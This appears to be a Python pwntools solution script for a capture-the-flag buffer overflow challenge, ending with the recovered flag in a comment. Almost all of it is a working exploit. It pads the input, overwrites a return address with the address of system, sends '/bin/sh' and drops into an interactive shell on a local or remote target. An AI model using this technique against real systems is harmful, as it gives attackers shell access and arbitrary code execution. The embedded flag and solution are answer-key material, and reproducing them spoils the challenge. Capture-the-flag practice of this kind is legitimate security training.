from pwn import *
import re

HOST, PORT = "192.168.125.111", 9111
BINARY = './chall'

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()

    # gdb.attach(p, '''
    # break *0x80486fe
    # break *0x08048758
    # ''')

    payload = b'y'
    payload += b'a' * 63
    payload += p32(0x08048898) # system
    p.sendlineafter("Wanna talk?", payload)

    payload2 = b'/bin/sh'
    p.sendlineafter('What is your name?', payload2)

    p.interactive()

solve()

# HTF{bof_1s_v3ry_fun_but_h4rd_th4nk_y0u_h4ck3r}
